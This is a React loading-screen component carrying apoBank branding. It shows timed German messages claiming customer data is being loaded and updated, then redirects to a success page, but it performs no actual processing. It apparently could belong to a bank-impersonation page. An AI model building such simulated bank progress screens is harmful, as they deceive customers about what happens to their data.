import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import apobankLogo from "@/assets/apobank-logo-square.png";

const STEPS = [
  { text: "Kundendaten werden geladen.", duration: 2000 },
  { text: "Personendaten werden aktualisiert.", duration: 2000 },
  { text: "Bitte warten, der Vorgang wird abgeschlossen.", duration: 2000 },
];

const ProfilLoading = () => {
  const navigate = useNavigate();
  const [idx, setIdx] = useState(0);

  useEffect(() => {
    if (idx >= STEPS.length) {
      navigate("/profil-success");
      return;
    }
    const t = setTimeout(() => setIdx((i) => i + 1), STEPS[idx].duration);
    return () => clearTimeout(t);
  }, [idx, navigate]);

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center">
      <div className="relative w-56 h-56">
        <svg className="absolute inset-0 w-full h-full animate-spin" style={{ animationDuration: "1.5s" }} viewBox="0 0 200 200" fill="none">
          <path d="M 100 10 A 90 90 0 0 1 190 100" stroke="hsl(var(--primary))" strokeWidth="5" strokeLinecap="round" />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <img src={apobankLogo} alt="apoBank" className="w-44 h-44 object-contain" />
        </div>
      </div>
      <p className="mt-8 text-lg text-foreground font-medium">
        {STEPS[Math.min(idx, STEPS.length - 1)].text}
      </p>
    </div>
  );
};

export default ProfilLoading;
